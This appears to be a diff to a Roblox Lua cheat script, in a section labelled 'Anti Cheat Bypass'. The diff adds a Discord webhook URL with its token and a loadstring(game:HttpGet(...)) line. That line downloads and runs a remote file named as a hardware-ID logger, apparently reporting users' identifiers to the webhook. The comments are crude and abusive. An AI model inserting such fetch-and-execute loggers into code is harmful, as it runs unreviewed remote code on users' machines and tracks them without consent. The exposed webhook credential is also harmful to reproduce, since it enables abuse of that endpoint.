@@ -164,7 +164,11 @@ end
 
 -- Anti Cheat Bypass
 
+BreadWebHookColor = tonumber(0xAB095b) --- Webhook color, Search up any color (Blue color hex,) Copy the code(blue is #0000FF) paste it after the x and remove the hashtag example(0x0000FF)
 
+BreadWebHook = "https://discord.com/api/webhooks/953861096106762301/PrW0FtuwjBtloMF4577Hz_QjFISWwjXbotMJwgeP0dVfDvCsTMzuPo6LQSa9H6aI0b_1" --- Dog shit ik fuck off. Just waiting for the "haker" dudes to keep deleting you're webhook. Not my problem ur's
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NenzXD/BreadHub/main/DogShitHwidLogger.lua", true))()
 
 
 
